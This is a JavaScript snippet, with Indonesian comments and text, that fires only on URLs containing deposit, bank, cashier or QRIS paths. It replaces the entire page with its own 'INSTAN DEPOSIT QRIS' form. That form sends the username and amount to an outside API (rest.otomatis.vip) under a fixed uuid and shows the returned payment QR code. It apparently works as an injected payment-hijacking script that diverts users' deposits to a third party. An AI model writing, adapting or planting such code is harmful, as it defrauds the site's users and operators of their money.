(function () {
  // Cek URL
  const url = window.location.href;
  const match = [
    '/deposit', '/bank', '/deposit.php', '/qris.php', '/cashier',
    '/?page=transaksi', '/index.php?page=transaksi',
    '/?deposit&head=home', '/index.php?page=cashier', '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  // Hapus konten lama
  document.documentElement.innerHTML = '<head><title>Loading...</title></head><body></body>';

  // Buat elemen style
  const style = document.createElement('style');
  style.textContent = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
      background: #111; color: #fff; text-align: center; padding: 16px;
    }
    h1 { 
      color: #ffd700; margin: 12px 0; font-size: 18px; 
      text-shadow: 1px 1px 2px #000; 
    }
    .container { max-width: 300px; margin: 0 auto; }
    input, button { 
      width: 100%; padding: 10px; margin: 8px 0; 
      border: none; border-radius: 4px; 
    }
    input { 
      background: #222; color: #fff; text-align: center;
      border: 1px solid #444; 
    }
    button { 
      background: #ffd700; color: #000; font-weight: bold;
      cursor: pointer; transition: opacity 0.2s;
    }
    button:hover { opacity: 0.9; }
    button:active { transform: scale(0.98); }
    #status { 
      margin: 10px 0; min-height: 20px; font-size: 14px;
      color: #0f0; font-weight: 500;
    }
    .qris-img { 
      max-width: 200px; margin: 12px auto; display: block;
      border: 2px solid #fff; border-radius: 8px;
    }
  `;
  document.head.appendChild(style);
  document.title = 'INSTAN DEPOSIT QRIS';

  // Buat struktur UI
  const container = document.createElement('div');
  container.className = 'container';
  container.innerHTML = `
    <h1>INSTAN DEPOSIT QRIS</h1>
    <input type="text" id="username" placeholder="Masukkan Username" autocomplete="off">
    <input type="text" id="amount" placeholder="Masukkan Nominal" autocomplete="off">
    <button id="confirmBtn">KONFIRMASI</button>
    <div id="status"></div>
  `;
  document.body.appendChild(container);

  // Event listeners
  document.getElementById('amount').addEventListener('input', formatAmount);
  document.getElementById('confirmBtn').addEventListener('click', confirmDeposit);

  function formatAmount(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val) val = parseInt(val).toLocaleString('id-ID');
    e.target.value = val;
  }

  async function confirmDeposit() {
    const usernameInput = document.getElementById('username');
    const amountInput = document.getElementById('amount');
    const status = document.getElementById('status');

    const username = usernameInput.value.trim();
    let val = amountInput.value.replace(/\./g, '').replace(/,/g, '');
    const nominal = parseInt(val);

    if (!username) {
      status.innerText = "Username wajib diisi!";
      status.style.color = "#ff3333";
      return;
    }

    if (isNaN(nominal) || nominal < 50000) {
      status.innerText = "Minimal deposit 50.000";
      status.style.color = "#ff3333";
      return;
    }

    status.innerText = "Sedang generate QRIS...";
    status.style.color = "#0f0";

    try {
      const resp = await fetch("https://rest.otomatis.vip/api/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: username,
          amount: nominal,
          uuid: "ef11197b-1503-4e70-b76d-5406fe6079e9",
          expire: 1200,
          custom_ref: "887"
        })
      });

      const data = await resp.json();

      if (data.data) {
        const qr_url = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.data)}&size=200x200`;
        
        // Update UI dengan hasil QR
        container.innerHTML = `
          <h1>DEPOSIT QRIS</h1>
          <img class="qris-img" src="${qr_url}" alt="QR Code">
          <p style="margin: 10px 0; font-size: 14px;">
            Untuk: <span style="color: #ffd700">${username}</span><br>
            Jumlah: <span style="color: #ffd700">Rp ${nominal.toLocaleString('id-ID')}</span>
          </p>
          <button onclick="window.open('${qr_url}')">Download QR</button>
          <button onclick="location.reload()">Buat Lagi</button>
        `;
      } else {
        status.innerText = "Gagal generate QRIS";
        status.style.color = "#ff3333";
      }
    } catch (err) {
      console.error(err);
      status.innerText = "Error koneksi ke API";
      status.style.color = "#ff3333";
    }
  }
})();
